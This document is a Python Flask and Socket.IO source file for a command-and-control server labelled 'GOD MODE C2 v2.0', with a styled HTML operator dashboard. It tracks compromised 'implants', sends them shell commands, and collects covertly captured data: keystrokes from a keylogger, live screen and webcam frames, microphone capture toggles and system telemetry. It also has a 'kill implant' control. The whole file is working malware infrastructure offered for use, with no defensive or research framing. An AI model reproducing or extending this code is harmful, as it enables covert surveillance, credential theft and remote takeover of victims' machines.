from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import json
from datetime import datetime
import base64
import threading
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'godmode-v2'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
CORS(app)

devices = {}
tasks = {}
last_seen = {}

MODERN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>GOD MODE C2 v2.0</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #1a1a2e;
            --accent: #00d4ff;
            --accent-glow: #00d4ff80;
            --success: #00ff88;
            --danger: #ff4757;
            --warning: #ffa502;
            --text-primary: #ffffff;
            --text-secondary: #b8b8b8;
            --glass: rgba(255,255,255,0.05);
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: linear-gradient(135deg, var(--bg-primary) 0%, #16213e 50%, #0f0f23 100%);
            color: var(--text-primary);
            font-family: 'Orbitron', monospace;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, var(--accent-glow) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, var(--success)20 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, var(--danger)10 0%, transparent 30%);
            z-index: -1;
            animation: pulse 4s ease-in-out infinite alternate;
        }
        @keyframes pulse {
            0% { opacity: 0.4; }
            100% { opacity: 0.8; }
        }
        
        .header {
            background: rgba(10,10,10,0.9);
            backdrop-filter: blur(20px);
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid var(--accent-glow);
            box-shadow: 0 8px 32px rgba(0,212,255,0.1);
        }
        .header h1 {
            font-size: 2.5em;
            background: linear-gradient(45deg, var(--accent), var(--success));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px var(--accent-glow);
            margin-bottom: 10px;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 300px 1fr 400px;
            grid-template-rows: 1fr;
            gap: 20px;
            padding: 20px;
            height: calc(100vh - 120px);
        }
        
        .glass-panel {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border: 1px solid var(--accent-glow);
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            position: relative;
            overflow: hidden;
        }
        .glass-panel::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--accent), transparent);
        }
        
        .devices-panel h3, .controls-panel h3, .streams-panel h3 {
            color: var(--accent);
            margin-bottom: 20px;
            font-size: 1.2em;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .device-item {
            background: rgba(255,255,255,0.03);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 1px solid transparent;
        }
        .device-item:hover, .device-item.active {
            border-color: var(--accent);
            box-shadow: 0 0 20px var(--accent-glow);
            background: rgba(0,212,255,0.1);
        }
        .device-id { font-size: 0.9em; opacity: 0.8; }
        .device-status { font-size: 0.75em; margin-top: 5px; }
        .online { color: var(--success); }
        .offline { color: var(--danger); }
        
        .live-video {
            width: 100%;
            height: 250px;
            background: #000;
            border-radius: 12px;
            border: 2px solid var(--accent-glow);
            margin-bottom: 10px;
            position: relative;
            overflow: hidden;
        }
        .video-status {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(0,0,0,0.7);
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8em;
        }
        
        .terminal {
            background: #000;
            color: var(--success);
            padding: 15px;
            height: 200px;
            border-radius: 12px;
            font-size: 0.85em;
            overflow-y: auto;
            white-space: pre-wrap;
            border: 1px solid var(--success);
        }
        
        .control-group {
            margin-bottom: 15px;
        }
        .control-group input {
            width: 100%;
            padding: 12px;
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--accent-glow);
            border-radius: 10px;
            color: var(--text-primary);
            font-family: inherit;
            margin-bottom: 10px;
        }
        .btn {
            background: linear-gradient(45deg, var(--accent), var(--success));
            border: none;
            color: white;
            padding: 12px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            width: 100%;
            margin-bottom: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0,212,255,0.3);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0,212,255,0.5);
        }
        .btn.danger { background: linear-gradient(45deg, var(--danger), #ff6b7a); }
        
        .keys-log, .audio-log {
            height: 150px;
            background: #000;
            border-radius: 12px;
            padding: 15px;
            font-size: 0.8em;
            overflow-y: auto;
            border: 1px solid var(--accent-glow);
            margin-bottom: 10px;
        }
        
        .telemetry-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            font-size: 0.9em;
        }
        .metric {
            background: rgba(255,255,255,0.03);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        .metric-value { font-size: 1.5em; font-weight: bold; }
        
        @media (max-width: 1200px) {
            .dashboard { grid-template-columns: 1fr; grid-template-rows: auto auto auto; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🐱 GOD MODE C2 v2.0</h1>
        <div id="selected-device" style="font-size: 1.1em; opacity: 0.8;"></div>
    </div>
    
    <div class="dashboard">
        <div class="glass-panel">
            <h3>📡 DEVICES</h3>
            <div id="devices-list"></div>
        </div>
        
        <div class="glass-panel">
            <h3>🎬 LIVE STREAMS</h3>
            <div class="live-video" id="screen-stream">
                <div class="video-status" id="screen-status">SCREEN OFFLINE</div>
            </div>
            <div class="live-video" id="webcam-stream">
                <div class="video-status" id="webcam-status">WEBCAM OFFLINE</div>
            </div>
        </div>
        
        <div class="glass-panel">
            <h3>⚡ CONTROLS</h3>
            <div class="control-group">
                <input id="command-input" placeholder="Enter shell command..." />
                <button class="btn" onclick="executeCommand()">▶️ RUN COMMAND</button>
            </div>
            <div class="control-group">
                <button class="btn" onclick="toggleScreenStream()">📺 TOGGLE SCREEN</button>
                <button class="btn" onclick="toggleWebcam()">📹 TOGGLE WEBCAM</button>
            </div>
            <div class="control-group">
                <button class="btn" onclick="toggleKeylogger()">⌨️ KEYLOGGER</button>
                <button class="btn" onclick="toggleMicrophone()">🎤 MICROPHONE</button>
            </div>
            <div class="control-group">
                <button class="btn danger" onclick="killDevice()">💀 KILL IMPLANT</button>
            </div>
        </div>
        
        <div class="glass-panel">
            <h3>📱 TERMINAL</h3>
            <div class="terminal" id="terminal-output"></div>
        </div>
        
        <div class="glass-panel">
            <h3>⌨️ KEYLOGGER</h3>
            <div class="keys-log" id="keylog"></div>
        </div>
        
        <div class="glass-panel">
            <h3>📊 TELEMETRY</h3>
            <div class="telemetry-grid">
                <div class="metric">
                    <div class="metric-value" id="cpu">--</div>
                    <div>CPU</div>
                </div>
                <div class="metric">
                    <div class="metric-value" id="ram">--</div>
                    <div>RAM</div>
                </div>
                <div class="metric">
                    <div class="metric-value" id="ip">--</div>
                    <div>IP</div>
                </div>
                <div class="metric">
                    <div class="metric-value" id="last-seen">--</div>
                    <div>LAST SEEN</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        
        socket.on('connect', () => console.log('🔥 C2 v2.0 CONNECTED'));
        
        socket.on('telemetry', (data) => {
            devices[data.id] = data;
            last_seen[data.id] = Date.now();
            if (data.id === currentDevice) updateTelemetry(data);
            updateDevices();
        });
        
        socket.on('screen_frame', (data) => {
            if (data.id === currentDevice) {
                document.getElementById('screen-stream').innerHTML = 
                    `<img src="data:image/jpeg;base64,${data.frame}" style="width:100%;height:100%;object-fit:cover;">`;
                document.getElementById('screen-status').textContent = `🟢 LIVE (${new Date().toLocaleTimeString()})`;
            }
        });
        
        socket.on('webcam_frame', (data) => {
            if (data.id === currentDevice) {
                document.getElementById('webcam-stream').innerHTML = 
                    `<img src="data:image/jpeg;base64,${data.frame}" style="width:100%;height:100%;object-fit:cover;">`;
                document.getElementById('webcam-status').textContent = `🟢 LIVE`;
            }
        });
        
        socket.on('keys', (data) => {
            if (data.id === currentDevice) {
                document.getElementById('keylog').textContent += data.keys + ' ';
                document.getElementById('keylog').scrollTop = document.getElementById('keylog').scrollHeight;
            }
        });
        
        socket.on('result', (data) => {
            if (data.id === currentDevice) {
                const term = document.getElementById('terminal-output');
                const ts = new Date().toLocaleTimeString();
                term.textContent += `[${ts}] ${JSON.stringify(data.result, null, 2)}\\n`;
                term.scrollTop = term.scrollHeight;
            }
        });
        
        function updateDevices() {
            const list = document.getElementById('devices-list');
            list.innerHTML = Object.entries(devices).map(([id, dev]) => {
                const now = Date.now();
                const isOnline = (now - (last_seen[id] || 0)) < 10000;
                return `
                    <div class="device-item ${id === currentDevice ? 'active' : ''}" onclick="selectDevice('${id}')">
                        <div><strong>${id}</strong></div>
                        <div class="device-id">${dev.host || 'Unknown'} / ${dev.user || 'n/a'}</div>
                        <div class="device-status ${isOnline ? 'online' : 'offline'}">
                            ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'} 
                            CPU: ${dev.cpu || 0}% RAM: ${dev.ram || 0}%
                        </div>
                    </div>
                `;
            }).join('');
        }
        
        function selectDevice(id) {
            currentDevice = id;
            document.getElementById('selected-device').textContent = `🎯 TARGET: ${id}`;
            updateDevices();
        }
        
        function updateTelemetry(data) {
            document.getElementById('cpu').textContent = data.cpu + '%';
            document.getElementById('ram').textContent = data.ram + '%';
            document.getElementById('ip').textContent = data.ip || 'N/A';
            document.getElementById('last-seen').textContent = new Date().toLocaleTimeString();
        }
        
        function executeCommand() {
            const cmd = document.getElementById('command-input').value;
            if (currentDevice && cmd) {
                socket.emit('task', {id: currentDevice, type: 'shell', cmd: cmd});
                document.getElementById('command-input').value = '';
            }
        }
        
        function toggleScreenStream() {
            socket.emit('task', {id: currentDevice, type: 'stream_screen'});
        }
        
        function toggleWebcam() {
            socket.emit('task', {id: currentDevice, type: 'stream_webcam'});
        }
        
        function toggleKeylogger() {
            socket.emit('task', {id: currentDevice, type: 'keylog_start'});
        }
        
        function toggleMicrophone() {
            socket.emit('task', {id: currentDevice, type: 'mic_start'});
        }
        
        function killDevice() {
            socket.emit('task', {id: currentDevice, type: 'kill'});
        }
        
        // Auto refresh
        setInterval(updateDevices, 2000);
        document.getElementById('command-input').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') executeCommand();
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(MODERN_HTML)

@app.route('/tasks/<device_id>')
def get_tasks(device_id):
    return jsonify({'tasks': tasks.get(device_id, [])})

@app.route('/telemetry', methods=['POST'])
def telemetry():
    try:
        data = request.json
        device_id = data.get('id')
        if device_id:
            devices[device_id] = data
            socketio.emit('telemetry', data)
        return jsonify({'status': 'ok'})
    except:
        return jsonify({'status': 'error'})

@app.route('/result', methods=['POST'])
def result():
    try:
        data = request.json
        socketio.emit('result', data)
        return jsonify({'status': 'ok'})
    except:
        return jsonify({'status': 'error'})

@app.route('/stream/screen', methods=['POST'])
def screen_stream():
    try:
        data = request.json
        socketio.emit('screen_frame', data)
        return jsonify({'status': 'ok'})
    except:
        return jsonify({'status': 'error'})

@app.route('/stream/webcam', methods=['POST'])
def webcam_stream():
    try:
        data = request.json
        socketio.emit('webcam_frame', data)
        return jsonify({'status': 'ok'})
    except:
        return jsonify({'status': 'error'})

@app.route('/keys', methods=['POST'])
def keys():
    try:
        data = request.json
        socketio.emit('keys', data)
        return jsonify({'status': 'ok'})
    except:
        return jsonify({'status': 'error'})

@socketio.on('task')
def handle_task(data):
    device_id = data.get('id')
    if device_id and device_id in devices:
        if device_id not in tasks:
            tasks[device_id] = []
        tasks[device_id].append(data)
        emit('task_sent', {'status': 'sent'})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
